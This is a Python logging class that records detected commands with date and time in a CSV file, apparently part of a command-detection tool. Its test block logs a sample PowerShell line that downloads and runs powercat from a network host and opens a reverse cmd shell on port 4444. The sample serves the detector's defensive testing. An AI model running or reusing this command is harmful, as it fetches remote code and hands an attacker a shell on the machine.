import pandas as pd
from datetime import datetime
import os 

class UpdateLogs:

    def __init__(self, file_name="logs.csv"):

        # GET THE PATH TO LOGS FILE
        backend_dir = os.path.dirname(os.path.abspath(__file__))
        project_root = os.path.dirname(backend_dir)
        self.file_path = os.path.join(project_root,"data",file_name)    

        # GENERATES LOG FILE IF NOT EXIST
        if not os.path.exists(self.file_path):
            os.makedirs(os.path.dirname(self.file_path), exist_ok=True)
            df = pd.DataFrame(columns=["Date", "Time Stamp", "Command detected"])
            df.to_csv(self.file_path, index=False)

    def add_entry(self, command):

        # GET CURRENT DATE AND TIME
        now = datetime.now()
        date = now.strftime("%Y-%m-%d")
        time = now.strftime("%H:%M:%S")

        # CREATE NEW ENTRY
        new_row = pd.DataFrame([{
            "Date": date,
            "Time Stamp": time,
            "Command detected": command
        }])

        # ENSURES RECOVERY IF THE FILE IS CORRUPTED OR MISSING
        try:
            df = pd.read_csv(self.file_path)
        except (pd.errors.EmptyDataError, FileNotFoundError):
            df = pd.DataFrame(columns=["Date", "Time Stamp", "Command detected"])

        # INSERT THE NEW ENTRY AT TOP IN LOG FILE
        updated_df = pd.concat([new_row, df], ignore_index=True)
        updated_df.to_csv(self.file_path, index=False)



# FOR TESTING 
if __name__ == "__main__":
    logger = UpdateLogs()
    cmd = '''powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.1.3/powercat.ps1');powercat -c 192.168.1.3 -p 4444 -e cmd"'''
    logger.add_entry(cmd)
